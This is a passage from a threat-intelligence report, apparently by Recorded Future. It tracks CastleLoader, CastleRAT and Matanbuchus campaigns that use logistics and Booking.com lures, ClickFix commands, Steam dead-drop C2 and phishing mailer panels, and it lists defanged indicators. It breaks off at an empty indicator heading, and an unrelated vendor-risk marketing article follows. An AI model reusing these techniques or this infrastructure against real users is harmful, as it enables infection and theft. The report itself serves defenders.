confirmation for a shipment, instructing them to copy and paste the link into a browser if it does not open directly. The threat actors often add a sense of urgency, warning that the link will soon expire. Clicking the link leads victims to a landing page designed to harvest information (see ). Insikt Group has observed multiple variations of these landing pages.: “dpeforms” lure used by TAG-160 (Source: Recorded Future)Notably, although Insikt Group was unable to retrieve the landing page associated with another Cluster 1–linked domain, , indexed Google search results indicate that the domain likely hosted the same or a similar page as observed in . DPE likely stands for “Direct Port Entry,” which is a system designed for exporters, allowing goods to be directly moved from their premises to the port and loaded onto the vessel for export without being transferred to a container freight station.: “dpeforms” page found in Google Search (Source: Recorded Future)After submitting their information, the victim is presented with ClickFix-style instructions, guiding them through a series of steps purportedly required to complete a document signing process (see ). By incorporating the DocuSign logo, the threat actors likely aim to enhance the perceived legitimacy of the page and further deceive the victim.: DocuSign-themed ClickFix used by TAG-160 (Source: Recorded Future)By following the instructions shown in , the victim unknowingly executes the command illustrated in . This command runs silently in the background, downloads and extracts a payload archive from a remote IP address, executes a Python-based malware using , and displays a decoy message to appear legitimate. Observed payloads delivered through this method include CastleLoader, HijackLoader, Rhadamanthys, and zgRAT.: ClickFix command (Source: Recorded Future)Use of Compromised InfrastructureAs part of TAG-160’s phishing infrastructure, the threat actors appear to rely not only on spoofed email addresses, as previously described, but also on compromised systems. Insikt Group has observed indications that the threat actors likely leveraged compromised infrastructure to send phishing emails. For example, at least one domain used to distribute phishing messages contained malware logs from infostealers such as LummaC2, including stolen credentials for a Namecheap account.Insikt Group identified a large number of domains and IP addresses associated with Cluster 1, all of which either impersonate logistics companies or align with logistics-themed phishing lures (see ). Notably, the majority of these domains include the subdomain  (for example, apps[.]englandlogistics[.]rateconfirmations[.]com), suggesting they were likely designed to impersonate England Logistics, as outlined in the previous section. One domain, , instead featured the subdomain , following a similar naming pattern.Insikt Group identified the subdomain files[.]loadstracking[.]com, hosted on the IP address  between July 6 and September 26, 2025, which was serving the file  (SHA256: d87ccd5a2911e46a1efbc0ef0cfe095f136de98df055eacd1c82de76ae6fecec). The ZIP folder contained a legitimate WinGup executable for Notepad++ that sideloaded a malicious libcurl.dll identified as DonutLoader. This loader subsequently retrieved three intermediate payloads from the legitimate subdomain files-accl[.]zohoexternal[.]com.Domain Re-Registration TacticSimilarly, Insikt Group assesses that to further enhance the perceived legitimacy of their infrastructure, the threat actor deliberately re-registered domains previously associated with legitimate logistics companies, in addition to using typosquatted domains.  provides two examples of this activity.: Re-registration of logistics-themed domains (Source: Recorded Future)Notably, the domain cdlfreightlogistics[.]com appears to have previously hosted a website associated with the legitimate company CDL Freight Logistics, Inc. in 2023. Similarly, the domain hometownlogisticsllc[.]com hosted a website for Hometown Logistics LLC in 2021 (see ).: Registration of domains previously owned by legitimate logistics companies (Source: Recorded Future)Public Complaints and Suspected Access to DAT and LoadlinkSome of the domains listed in the  section have been publicly referenced in connection with suspicious or fraudulent activity. For example, the email address david[@]cdlfreightlogistics[.]com, associated with the domain cdlfreightlogistics[.]com, first appeared on August 26, 2025, in a public Telegram channel named “current_hot_loads”, a forum used by individuals and companies in the logistics industry to share information such as market rates. In that instance, a user asked other members whether an email was legitimate (see ). Several respondents indicated they did not believe it to be legitimate.Example phishing email sent by TAG-160 (Source: Recorded Future)While Insikt Group was unable to obtain additional details about the email exchange linked to the email posted in the channel, the available text suggests that the threat actor initially contacted potential victims without including malicious content, likely aiming to establish rapport before sending follow-up messages containing malicious links.In another instance, Insikt Group identified a post from an employee of a legitimate logistics company based in Rhode Island, USA, describing an incident in which a threat actor created accounts impersonating their company on DAT Freight & Analytics () and Loadlink Technologies (), both platforms operating in the freight matching industry (see ). The fraudulent registrations used fake company information, including the email address , which is associated with Cluster 1–linked infrastructure. Notably, in line with Cluster 1’s typical patterns, the email addresses used in these operations often consist of only a first name (for example, Paul). The employee reported having contacted both DAT and Loadlink to alert them to the fraudulent activity.: Complaint on Facebook written by an individual targeted by TAG-160 (Source: Recorded Future)Based on a confirmation email from one of the platforms’ abuse reporting teams, which the employee shared on Facebook as well, it appears that the threat actor was also using a Gmail address impersonating their company, maritza[.]rmlogisticsol[@]gmail[.]com (see ).: Email shared by an individual targeted by TAG-160 (Source: Recorded Future)Threat actors associated with Cluster 1 appear to have access to fraudulent DAT and Loadlink accounts, as evidenced by a user report of fraudulent activity on Facebook (see ) and further supported by additional profiles identified by Insikt Group (see ). Furthermore, Insikt Group assesses that the threat actors may also have access to compromised legitimate accounts, given the substantial volume of stolen credentials associated with the domains  and  observed in Recorded Future Identity Intelligence.: Account information linked to TAG-160 (Source: Recorded Future)Access to platforms like DAT Freight & Analytics and Loadlink Technologies not only enables the threat actors to enhance the appearance of legitimacy, allowing them to maintain plausible profiles should potential victims attempt verification, but also provides opportunities to gather contact information for prospective targets and obtain additional contextual data, such as details on specific loads, dates and times, documents, or related materials, which can then be repurposed as spearphishing lures. In addition, although not verified in this specific case, the threat actors may also post fraudulent load listings containing malicious content, potentially resulting in malware infections.Possible Overlap with September 2024 CampaignIn September 2024, Proofpoint reported on an unattributed activity cluster observed since at least May 2024. The threat actors targeted transportation and logistics companies in North America to distribute various malware families, including LummaC2, StealC, and NetSupport RAT, as well as remote monitoring and management (RMM) tools such as SimpleHelp, PDQ Connect, Fleetdeck, and ScreenConnect. The campaigns employed several techniques: The threat actors compromised legitimate email accounts belonging to transportation and shipping companies, injecting malicious content into existing email threads to enhance credibility. They also used compromised accounts on DAT Freight & Analytics and Loadlink platforms to post fraudulent load listings containing malicious URLs leading to RMM downloads. Lastly, they launched broader phishing waves that directed recipients to staging web pages hosting RMM installers. Most campaigns involved Google Drive URLs or attached .URL shortcut files that, when executed, used SMB to retrieve an executable from a remote share, leading to malware installation.While Insikt Group has not identified direct technical overlaps (for example, shared infrastructure), the similar targeting and partially overlapping tactics, particularly the use of DAT Freight & Analytics and Loadlink, suggest a possible connection between this activity cluster and Cluster 1 (this is a low-confidence assessment).Notably, in November 2025, Proofpoint reported again on a possibly related activity where cybercriminals targeted trucking and logistics companies using RMM tools to hijack shipments. The attackers lured victims through fake load postings or compromised email threads, delivering malware or RMM software to gain access. This campaign highlights the growing convergence of cyber and physical cargo theft as criminals exploit digital logistics systems.Cluster 2: Matanbuchus and Mailer Tool Activity Tracked as TAG-161Cluster 2, tracked as TAG-161, has been active since at least June 2025 and remains operational at the time of analysis. The cluster leverages infrastructure impersonating Booking.com and employs ClickFix techniques. It primarily delivers CastleLoader and other payloads, including Matanbuchus. Notably, Insikt Group observed this cluster using Matanbuchus. Evidence indicates that the cluster relies mainly on threat actor-controlled infrastructure. Furthermore, Insikt Group identified a previously unreported phishing email management tooling, which appears to be used by threat actors linked to Cluster 2.Matanbuchus Activity and Booking.com-Themed InfrastructureAlongside CastleLoader, several Matanbuchus samples were distributed through Booking.com-themed ClickFix campaigns associated with Cluster 2. Notably, Insikt Group had previously reported Matanbuchus activity linked to CastleRAT in an earlier publication, where the Matanbuchus C2 panel was hosted on the adjacent IP address,  (see ).: Matanbuchus panel on 185[.]39[.]19[.]164 (Source: Recorded Future)Matanbuchus is a C-based downloader MaaS available since 2021. One of its primary objectives is secrecy, which is in part fostered by limiting sales to a select number of customers. Currently at version three, it is continually maintained and improved by its creator BelialDemon. BelialDemon offers Matanbuchus 3.0 as a monthly rental service with two pricing tiers based on the communication protocol: $10,000 per month for the HTTPS-based version and $15,000 per month for the DNS-based version.Recorded Future Malware Intelligence’s most recent Matanbuchus sample at the time of writing communicated with its C2 server at , a domain behind Cloudflare but linked to the IP address  (TRIBEKA-AS, PA; AS211059). This IP address was also associated with the domain , previously reported by Morphisec. Historical analysis of the same IP revealed several additional Matanbuchus C2 domains, including  and .Additional Booking.com-Themed InfrastructureBy analyzing the same /24 CIDR range that hosted the Matanbuchus infrastructure during the period of observed activity, Insikt Group identified additional IP addresses and domains linked to Booking.com-themed ClickFix operations. These network indicators, detailed in , are tracked by Insikt Group as part of Cluster 2.Phishing Email Management ToolingBy analyzing the IP addresses hosting the domains listed in , Insikt Group identified three that stood out for each hosting three previously unreported websites or management panels operating on high ports. The panels featured the following HTML titles: “Менеджер Email”, “Менеджер Редиректов и рассылок”, and “Менеджер Редиректов и Email” (translated as “Redirect and Email Manager”). Based on their visual appearance, technical implementation, and thematic focus, Insikt Group assesses that these websites are used in tandem as part of campaigns specifically targeting Booking.com.Website 1: Redirect and Email Manager (“Менеджер Редиректов и Email”)The first website, hosted on port 56723, serves as a web-based interface for managing bulk redirections and email campaigns (see ). It integrates redirect generation, SMTP configuration, and email distribution capabilities within a single dashboard. The design, terminology, and functionality closely align with those typically observed in malspam or phishing infrastructure management panels.Within the document object model (DOM) of the website, Insikt Group identified two email addresses, with one of them being likely a compromised account used to send phishing emails. At the time of discovery, the rambler email address, likely a burner account, appeared within the page’s SMTP configuration with associated credentials, indicating its use as the primary sender account for automated bulk email delivery, consistent with the panel’s design for coordinated phishing or spam distribution. The DOM also contained an AWS access key.Additionally, the DOM referenced a set of domains, some of which are listed in , while others were newly identified and are listed in . By searching for the phrase “Сервис редиректов работает для [domain]” (translated as “The redirect service works for [domain]”), Insikt Group discovered further related domains, likewise shown in .Website 2: Email Manager (“Менеджер Email”)The second website, hosted on port 56724, closely resembles the first “Redirect and Mailing Manager” panel but exhibits several notable configuration differences (see ). These include a distinct AWS username, an SMTP sender address, bred[@]booking-porta[.]com, as well as different logging settings and a few additional indicators of compromise. Furthermore, the website specified  as its proxy server.Website 3: Booking-Mailer V2.2 (“Менеджер Редиректов и рассылок”)The third website, hosted on port 56725, features a substantially larger DOM and functions as a combined redirect generator and mass-mailing platform (see ). The user interface exposes key capabilities, including domain selection, subdomain base-name configuration, HTML email templating (supporting URL placeholders for generated redirects), target file uploads, worker/thread management, SMTP pool configuration and validation, proxy editing, and real-time logging and statistics. Redirects are constructed using a domain and base name to generate unique subdomain links following the format: [identifier].[base_name].[main_domain].The domains , , , , and  are all referenced within the DOM.Notably, within the “debug logs” in the DOM of the website, Insikt Group found a range of proxy servers with varying high ports. The IP addresses are listed in .11599, 12305, 13267, 1327510324, 10616, 14195, 1419611264, 11860, 14100, 14122: Proxy IP addresses found in DOM of “Booking-Mailer V2.2” tool (Source: Recorded Future)Insikt Group identified additional instances of the Phishing Email Management Tooling, all hosted on IP addresses announced by the same set of Autonomous Systems (ASes). The identified IP addresses are listed in . The domains hosted on these IP addresses are listed in .Certificate subject common name: CastleRAT and Matanbuchus C2 servers identified within the same /24 range ( and , respectively)Hosts hotel-themed domainsCertificate subject common name: Suspected testing server due to the number of domains including the keywords “test” and “demo”: Additional infrastructure instances of the Phishing Email Management Tooling (Source: Recorded Future)ASN Cluster Possibly Linked to BearhostInsikt Group observed significant infrastructure activity associated with AS216341 (STIMUL-AS) and AS216341 (OPTIMA-AS) throughout this research. Both ASes were established on March 11, 2025, and have demonstrated consistent malicious activity since their inception. According to researchers at DeepCode, these providers maintain strong links to the BEARHOST bulletproof hosting network, a known enabler of malicious cyber operations. BEARHOST and associated providers have reportedly serviced ransomware operations, including LockBit, Conti, MedusaLocker, as well as sanctioned entities such as Garantex, Lazarus Group, Zservers, and Nobitex. That same research further identified malicious activity and customer bases linked to both AS211659 and AS216341, consistent with Insikt Group’s own observations of Lumma, Rhadamanthys, and Matanbuchus within these autonomous systems. This overlap in observed threats reinforces the assessment that both autonomous systems are part of a broader BEARHOST-aligned infrastructure ecosystem supporting financially motivated cyber operations.Infrastructure Similarities with TAG-157 (RefBroker)Insikt Group has previously reported on threat actors impersonating Booking.com, including TAG-157, also known as RefBroker. Notably, domains associated with TAG-157 have been observed hosted on IP address , adjacent to , with the latter being part of TAG-161’s infrastructure. More broadly, both TAG-157 and TAG-161 appear to favor the same set of ASNs discussed in the section ASN Cluster Possibly Linked to Bearhost. At present, however, the exact relationship between TAG-157 and TAG-161 remains unclear.Cluster 3: Booking.com Impersonation ActivityCluster 3 has been active since at least March 2025 and remains operational at the time of analysis. The cluster leverages infrastructure impersonating Booking.com, ClickFix techniques, and uses Steam Community pages as a dead drop resolver to deliver CastleRAT via CastleLoader. Although the techniques appear similar to those described in Cluster 2, Insikt Group has not identified any technical overlaps between Clusters 2 and 3 at this time.Insikt Group noted a CastleRAT sample that leveraged a Booking.com phishing domain,  (see ) The phishing domain tricks users into running a malicious PowerShell command (via ClickFix techniques) that downloads a second-stage script from . This script retrieves and executes a .NET loader that repeatedly spawns new PowerShell processes to add Windows Defender exclusions for the eventual payload () using a User Account Control (UAC) prompt flooding loop to bypass analysis sandboxes and security controls. Once exclusions are applied, the loader decrypts and launches the CastleLoader payload, which then reaches out to its C2 domain, , resolved through a Steam Community profile. The use of Steam Community profiles allows attackers to update infrastructure dynamically without redeploying malware (see ). CastleRAT samples that use Steam for deaddrops may sometimes contain a hard-coded backup C2 in the event the deaddrop C2 retrieval fails. A list of all observed Steam Community profiles and the various C2 domains observed on each is found in : GrayBravo’s CastleRAT using Steam Community for dead drop resolving (Source: Steam)At the time of analysis,  and  were both hosted on , while the Steam-resolved C2 domain, , was hosted on an adjacent IP, . This close placement within the same /24 subnet suggests that the operators likely acquired these IP addresses around the same time. It also suggests that they were assigned sequentially by the hosting provider, Global Connectivity Solutions (AS215540). A similar pattern was later observed across the  range, where Booking.com-themed phishing domains were hosted on  and the Steam-resolved C2 domains,  and , were hosted on .: Booking.com-themed ClickFix linked to Cluster 3 (Source: Recorded Future)When scanned, the Booking.com-themed domains typically return either a Cloudflare-themed turnstile page or a “turnstile token missing” error message (1, 2). Further pivoting from the domain  uncovered a broader cluster of activity encompassing multiple additional domains and IP addresses, most of which appear to be used to impersonate Booking.com. The domains and associated IP addresses are detailed in . Notably, while the domains commonly use Cloudflare name servers, many of the domains ultimately resolve to threat actor–controlled IP addresses.Cluster 4: Malvertising and Fake SoftwareCluster 4 has been active since at least April 2025 and remains operational at the time of analysis. This cluster employs malvertising and fake software installers, impersonating legitimate tools such as Zabbix and RVTools, to distribute CastleLoader and NetSupport RAT.Based on Insik Group observations, the cluster has used CastleLoader C2 infrastructure hosted on domains including . It has also deployed NetSupport RAT samples that communicate with C2 servers at IP addresses such as  and . Notably, the domain  resolved to these NetSupport-associated IP addresses during the period of activity.The CastleLoader payloads are distributed through fake GitHub repositories and delivered as electronically signed MSI installers, often bearing Extended Validation (EV) certificates, similar to those observed in previous Bumblebee campaigns. These signed builds have been attributed to organizations including LLC KHD GROUP (issued by GlobalSign) and INTYNA EXIM PRIVATE LIMITED (issued by SSL.com), among others. Notably, “Sparja”, an Exploit Forum user discussed below and potentially linked to CastleLoader, has been active in discussions regarding EV certificates earlier this year.Possible Connection to Exploit Forum User SparjaAnalysis of historical CastleLoader infrastructure identified one anomalous instance that may indicate a link to a threat actor named “Sparja”. A panel hosted on  and exposed on port 5050 diverged from established CastleLoader panel characteristics. While known CastleLoader administrative interfaces typically display the HTML title “Castle,” this instance returned the title “Sparja.” Review of the panel’s DOM file revealed that it referenced a CSS file with a filename identical to one observed in verified CastleLoader panels. While the overlap does not constitute a conclusive stylistic correlation, it can suggest potential code reuse or reliance on a shared panel template between CastleLoader and the “Sparja” interface. Insikt Group identified one other Sparja panel with the same HTML title on the IP address  (see )Sparja panel (top) and CastleLoader panel (bottom) (Source: Recorded Future)Activity associated with the alias “Sparja” on the underground Exploit Forum provides additional context for possible connections. Obtained via proprietary means, Insikt Group assesses that Sparja is also active on the top-tier Russian-language forum XSS. Insikt Group bases this assessment on the user’s XSS activity, in which the user viewed similar topics related to malware loaders, EV certificates, and bypass software.On December 22, 2024, Sparja authored a thread on Exploit Forum, looking to buy or rent a dropper (see ). In a documented dispute spanning from January to February 2025, Sparja engaged a user known as “ppro” to develop a “private solution, a dropper or loader for an executable file.” The dispute concluded with ppro’s ban from the forum, following a history of earlier account suspensions and reinstatements. Given the timeline of the events, Insikt Group assesses it is unlikely ppr0 had involvement in CastleLoader’s development; however, Sparja’s expressed interest in acquiring a custom loader prior to CastleLoader’s appearance supports the assessment that Sparja was actively pursuing a dropper or loader functionality consistent with CastleLoader’s purpose.Sparja in search of a dropper or loader on Exploit Forum (Source: Recorded Future)Forum discussions in October 2025 indicate continued interest in Sparja’s apparent tooling (see ). A subsequent post sought contact with “the coder who wrote the Sparja dropper,” implying that a distinct dropper associated with Sparja had circulated within the underground market. This activity’s timeline aligns with CastleLoader operations and suggests that Sparja’s development or procurement of loader-type malware was known among peers during the same operational period.A related CastleLoader sample, distributed as an MSI installer, was identified in Bazaar Abuse data as originating from the GitHub account github[.]com/legend123451111. The same account appears in a Cisco Talos report describing a malware-as-a-service (MaaS) ecosystem leveraging GitHub for payload distribution, including malware families such as Amadey and Emmenhtal. Talos noted consistent naming conventions, repository structures, and file types across multiple associated GitHub accounts, with the earliest activity dated to January 2025. The report concluded that the operators of these accounts likely facilitated multi-tenant malware distribution rather than single-threat actor campaigns.The available evidence does not confirm that Sparja directly participated in the MaaS network described by Talos; however, the CastleLoader sample that originated from github[.]com/legend1234561111, which contained the MSI installer, is linked to the Sparja-named CastleLoader panel, indicating a potential overlap between the GitHub-based distribution channel and infrastructure associated with Sparja. This connection suggests that Sparja may have either used an existing MaaS framework to distribute CastleLoader payloads or operated within the same delivery ecosystem.On October 27, 2025, Sparja posted a comment on Exploit Forum within a thread advertising eDragon_x’s dropper service, stating that they had been using the service for several months and considered the dropper reliable. This post is notable as it reinforces Sparja’s continued interest in droppers and loaders, a recurring theme in their activity. The post also situates Sparja in proximity to eDragon_x, a threat actor operating within overlapping underground circles that include “tramp”, a known threat actor reportedly identified as Oleg Nefedov. Tramp is associated with a spamming network responsible for distributing Qbot (aka Qakbot) and is identified as the founder of the BlackBasta ransomware group. Tramp was also an affiliate for several ransomware operations, such as REvil and Conti; he also maintained close ties with Rhysida and Cactus.While there is no direct evidence of collaboration between Sparja and tramp, the shared participation across related forums and service providers like eDragon_x suggests that Sparja operates within a network of threat actors closely associated with major ransomware distribution and loader development ecosystems.Insikt Group identified numerous suspected victim IP addresses communicating with the Tier 1 C2 infrastructure associated with CastleRAT. While the majority of these IP addresses appear to be geolocated in the United States, only a limited number of actual victims could be positively identified. Most victims remain unidentified and cannot be confirmed; however, Insikt Group assesses it is likely that at least some of them represent private individuals who became infected. It is important to note that of the entities Insikt Group identified, the infection might have occurred on individual machines within the network of the victim organization or by using the victim’s WiFi rather than on the organization's network directly. For instance, within the university context, it is likely that some victims are individual machines, such as those used by students, connected to the university's network.Leverage the IoCs in  to investigate potential past or ongoing infections, both successful and attempted, and use the Recorded Future Intelligence Cloud to monitor for future IoCs associated with GrayBravo (formerly tracked as TAG-150), TAG-160, TAG-161, and other threat actors.Monitor for validated infrastructure associated with the malware families discussed in this report, including CastleLoader, CastleRAT, Matanbuchus, and numerous others identified and validated by Insikt Group, and integrate these indicators into relevant detection and monitoring systems.Leverage Sigma, YARA, and Snort rules provided in , , , , , , and  in your SIEM or endpoint detection and response (EDR) tools to detect the presence or execution of CastleLoader, CastleRAT, and Matanbuchus. Additionally, use other detection rules available in the Recorded Future Intelligence Cloud.Use Recorded Future Network Intelligence to detect instances of data exfiltration from your corporate infrastructure to known malicious infrastructure. This can be achieved by employing specific queries and filtering the results based on your assets.Use the Recorded Future Intelligence Cloud to monitor GrayBravo, TAG-160, TAG-161, other threat actors, and the broader cybercriminal ecosystem, ensuring visibility into the latest tactics, techniques, and procedures (TTPs), preferred tools and services (for example, specific threat activity enablers [TAEs] used by threat actors), and emerging developments.Use Recorded Future AI’s reporting feature to generate tailored reports on topics that matter to you. For example, if you want to stay informed about activities related to specific personas such as Sparja, you can receive regular AI-generated updates on this threat actor’s activity on Exploit Forum.As anticipated in earlier assessments, GrayBravo has significantly expanded its user base, evidenced by the growing number of threat actors and operational clusters leveraging its CastleLoader malware. This trend highlights how technically advanced and adaptive tooling, particularly from a threat actor with GrayBravo’s reputation, can rapidly proliferate within the cybercriminal ecosystem once proven effective. Given GrayBravo’s established history of developing and deploying custom malware families, it is highly likely the group will continue to release new tools and capabilities in the near term, further strengthening its position within the MaaS market.Among observed activity clusters, TAG-160 stands out for its highly targeted campaigns against the logistics sector. The cluster demonstrates a deep understanding of industry operations, impersonating legitimate logistics firms, exploiting freight-matching platforms, and mirroring authentic communications to enhance its deception and impact. This indicates an increasing sophistication among niche, sector-specific threat actors who maintain a low profile through minimal footprints and precise targeting.Insikt Group will continue to closely monitor GrayBravo along with related threat actors, such as TAG-160 and TAG-161, to detect emerging threats and evaluate the group’s strategic direction within the broader cybercriminal ecosystem.Appendix A: CastleLoader C2 Serversdonttouchthisisuseless[.]icu(Source: Recorded Future)Appendix B: Additional Infrastructure Likely Linked to CastleLoadertradlngview-desktop[.]biztradlngvlewdesktop[.]shop(Source: Recorded Future)Appendix C: Logistics-Themed Infrastructure Used by TAG-160cdlfreightlogistics[.]comhometownlogisticsllc[.]comredlightninglogistics[.]comredlightninglogisticsinc[.]comstarshiplogisticsgroupllc[.]com(Source: Recorded Future)Appendix D: Booking.com-Themed Domains Linked to TAG-161(Source: Recorded Future)Appendix E: Additional Infrastructure Linked to “Redirect and Email Manager” ToolDomain used in “Completed processing task” log, per the DOM(Source: Recorded Future)Appendix F: Steam Community Profiles and their Corresponding C2 Domains, alongside the IP Addresses that Hosted the C2 domainsSteam Community Profile Linkhxxps://steamcommunity[.]com/id/tfy5d6gohu8tgy687r745[.]134[.]26[.]4191[.]202[.]233[.]132hxxps://steamcommunity[.]com/id/desdsfds34324y3g46[.]28[.]67[.]22195[.]211[.]97[.]51hxxps://steamcommunity[.]com/id/fio34h8dsh3iufshxxps://steamcommunity[.]com/id/jeg238r7staf378shxxps://steamcommunity[.]com/id/krouvhsin34287f7h3justnewdmain[.]com(Source: Recorded Future)Appendix G: Booking.com-Themed Infrastructure Linked to Cluster 3bookingnewprice109034[.]icubookingnewprice204167[.]icuguest-request44565494[.]comguest-request666543[.]comguest-request677653[.]comguest-update666532345[.]comhotelroomprice1039375[.]icurequest-info4433345[.]comupdate-guest4398317809[.]comupdate-reques898665[.]com(Source: Recorded Future)Appendix H: Indicators of Compromise (IoCs)CastleRAT C2 IP Addresses:

Continuous monitoring is now a must.Five common risk scenarios: Supply chain attacks, widespread software vulnerabilities, hidden fourth-party dependencies, vendor credential theft, and vendor instability each illustrate how “trusting” vendors can lead to breaches or business disruptions.Intelligence-driven defense: Recorded Future’s platform provides real-time visibility into your vendor ecosystem—from dark web credential leaks to fourth-party relationships—enabling proactive mitigation before incidents impact your organization.From trust to verification: The solution is to move from static trust to continuous verification. By continuously assessing vendors’ cyber and business health (and even integrating intelligence into workflows like ServiceNow), security leaders can vastly strengthen their vendor risk management framework.Your Vendor Ecosystem Is a Black Box: It’s Time to Turn on the LightsFor CISOs and risk leaders, the attack surface now goes far beyond the footprint of the business. It’s a sprawling web of SaaS vendors, software suppliers, MSPs, payment processors, logistics partners, and niche fourth parties your vendors rely on. Every connection expands risk—often outside direct visibility. In other words, your security may only be as strong as your weakest vendor or partner.Traditional third-party risk management (TPRM)—static security questionnaires and annual audits—cannot keep pace. They describe what a vendor claimed their security looked like months ago, not what it is right now. Meanwhile, the most damaging events (supply chain attacks, zero-day exploitation, credential resale, concentration failures) unfold in hours and days, not quarters.This gap between point-in-time paperwork and real-time risk is why third-party exposure has become a primary vector for catastrophic breaches and business outages.This article will highlight and analyze 5 real-world third-party risk examples. For each, we'll show why traditional methods fail and how continuous, real-time third-party risk management and threat intelligence is the only effective prevention.5 Third-Party Risk Examples and How to Prevent ThemModern vendor risk comes in many forms. Let’s explore five common scenarios—and how proactive measures can stop them:Type 1: The Software Supply Chain Attack One of the most damaging third-party risks is a software supply chain attack. This occurs when threat actors breach a trusted software vendor’s development environment and secretly inject malicious code into a legitimate, digitally signed software update. The tainted update, a “Trojan horse,” is then distributed to the vendor’s customers, giving the attacker access into thousands of networks at once.The SolarWinds Orion breach is a quintessential case. In 2020, nation-state hackers compromised SolarWinds’ build pipeline and inserted malware into an Orion software update. The malicious update, being validly signed, was pushed to around 18,000 customers, including numerous government agencies and Fortune 500 companies, who all gladly installed it, thereby granting the attackers insider access to their systems.Why Traditional Methods Fail: A standard vendor security questionnaire or audit would never have caught this. SolarWinds had passed assessments and appeared reputable. The update itself was digitally signed and appeared “trusted” to antivirus scanners and other controls. In short, you cannot audit your way out of a risk that’s been inserted into a trusted product’s software supply chain.The Intelligence-Led Solution: Preventing a supply chain attack means detecting subtle warning signs before the breach fully unfolds. Recorded Future’s platform continuously monitors for early indicators tied to your vendors. If threat actors known for targeting CI/CD pipelines start discussing or probing one of your software vendors, you’d know. If intelligence suggests a vendor’s code-signing certificate may be compromised, you’d get an alert. Armed with this foresight, you could elevate that vendor’s risk status, scrutinize their software updates more closely, and even hunt for indicators of compromise in your environment before the breach becomes public knowledge.Type 2: The Widespread Third-Party Vulnerability A critical software vulnerability (often a zero-day) is discovered in a common component that many of your vendors use. It could be an open-source library, a popular IT tool, or a cloud service. You have no direct visibility that your suppliers rely on this component. Attackers quickly develop an exploit and start compromising organizations at scale via this flaw, long before most victims even realize they’re exposed through their third parties. The MOVEit Transfer zero-day (exploited by the Cl0p ransomware group) and the Log4j “Log4Shell” vulnerability are perfect examples of this risk. In the case of MOVEit, a single bug in a widely used file-transfer product led to the mass theft of data from thousands of companies, many of whom weren’t even direct customers of MOVEit, but their vendors were. Similarly, the Log4j flaw impacted countless businesses indirectly because software used by their contractors and providers included the vulnerable library.Why Traditional Methods Fail: This is fundamentally a technology visibility problem. A point-in-time survey asking your vendors “Do you use MOVEit?” is too little, too late. By the time you send out a questionnaire and get a reply (if you get one at all), attackers may have already exploited the vulnerability and exfiltrated data. No organization can manually track every piece of software in their extended vendor ecosystem through periodic check-ins. In the MOVEit incident, many companies had no idea they were at risk until news of data breaches surfaced. Traditional vendor risk management simply isn’t designed to monitor technical exposure in real time.The Intelligence-Led Solution: Defending against widespread vulnerabilities requires connecting two dots instantly: what’s vulnerable and who in your supply chain is using it. This is where an intelligence platform shines. Recorded Future’s approach combines technical attack surface intelligence with real-time vulnerability tracking. It continuously scans the internet to map out the external-facing tech stack of your third parties. The moment a new critical vulnerability is disclosed, Recorded Future’s intelligence automatically checks which of your vendors are running that technology. You receive an immediate, prioritized alert such as: “CRITICAL: 15 of your third-party vendors are exposing servers running [the vulnerable software]. Prompt them to apply patches or mitigations immediately.”Type 3: The Fourth-Party & Concentration Risk Sometimes the biggest risk in your vendor ecosystem isn’t with your direct third parties, but with their key dependencies. A “fourth party” is a vendor of your vendor, and if one that many of your critical vendors rely on goes down, it can create a single point of failure. A single outage can cascade up the chain, disrupting operations even when direct vendors appear secure. The 2021 ransomware attack on Kaseya’s VSA remote monitoring and management platform is a textbook case. Kaseya primarily served managed service providers (MSPs), who in turn delivered IT services to thousands of downstream customers. When attackers exploited Kaseya VSA, they were effectively able to push ransomware out through those MSPs to many organizations that had no direct relationship with Kaseya at all—they only “knew” their MSP. A single fourth-party dependency became the pivot point for a broad, multi-industry disruption.Why Traditional Methods Fail: If you looked at each of your primary (third-party) vendors in isolation, they all might have passed your security reviews with flying colors. What the traditional assessment missed was that ten of those vendors all relied on the same subcontractor for a critical function, a critical audit blind spot. Most organizations only discovered their exposure to Kaseya after MSP-delivered systems were already encrypted. Without continuous visibility into your vendors’ vendors, this kind of concentration risk remains invisible until it’s too late.The Intelligence-Led Solution: The only way to manage fourth-party and concentration risk is through continuous mapping of your vendors’ vendors, coupled with dynamic risk scoring. Recorded Future’s Third-Party Intelligence solution automatically identifies and maps these Nth-party relationships throughout your supply chain. In practice, this means if a critical fourth-party suffers a breach, you won’t be finding out via the news days later. Instead, your intelligence dashboard would immediately show that entity’s risk score spiking from, say, a modest 50 to a critical 99. This timely insight gives you a head start to activate business continuity and incident response plans. You immediately know exactly which of your vendors are impacted and can work to contain the fallout.Type 4: The Vendor Credential Compromise Not all third-party attacks involve sophisticated malware or supply chain tampering. Sometimes hackers just log in through the front door. In this scenario, a threat actor steals valid credentials from one of your vendors and uses those to access your systems. Perhaps an employee at a smaller, “low-risk” vendor, like an HVAC contractor, falls victim to a phishing email or unknowingly runs info-stealer malware on their laptop. Their VPN login or application credentials to your network get quietly harvested and sold on the dark web. An attacker buys the login, bypasses your multi-factor authentication, and walks into your network posing as a legitimate third-party user.Why Traditional Methods Fail: A vendor security questionnaire cannot prevent an individual at a partner company from clicking a phishing link or using a weak password. Your vendor might have all the right policies on paper, but those policies are irrelevant the moment an attacker has a valid username and password in hand. Traditional TPRM programs are about vetting a vendor’s security controls and compliance, but they don’t provide real-time awareness of things like a password leak or dark web sale of access related to that vendor.The Intelligence-Led Solution: The key to stopping a credential-based breach is catching those compromised credentials before they are used against you. This calls for continuous identity-centric intelligence. Recorded Future’s Third-Party Intelligence module includes automated monitoring of a wide range of sources, from dark web forums to infostealer logs and criminal marketplaces, specifically watching for any mention of your organization’s partners and their accounts. The moment a set of credentials associated with one of your vendors appears in an illicit context, you receive a high-priority alert. Your team can immediately revoke or reset that vendor account and investigate the extent of access. This is the definition of proactive defense: you’re effectively shutting the door on the attacker before they can walk through it.Type 5: The Operational & Financial Instability Risk Sometimes the greatest third-party risk is a vendor’s operational or financial collapse. Consider a scenario where a critical vendor suddenly encounters a non-cyber crisis like bankruptcy, a major lawsuit or regulatory sanction, a natural disaster, or even a geopolitical event that halts their business. From your security team’s perspective everything looked fine, but virtually overnight this partner’s failure threatens to grind your business to a halt. A headline-grabbing case occurred with the sudden collapse of Silicon Valley Bank (SVB) in March 2023. SVB wasn’t attacked by hackers; it suffered a bank run and shut down in a matter of days. Companies that used SVB as a banking partner or for credit found themselves unable to access funds or process payroll, creating a cascade of operational and financial issues.Why Traditional Methods Fail: A standard security questionnaire or compliance-focused vendor review is utterly blind to this category of risk. Your CISO’s third-party risk process likely doesn’t include reviewing a vendor’s financial statements or monitoring news about their executives’ legal 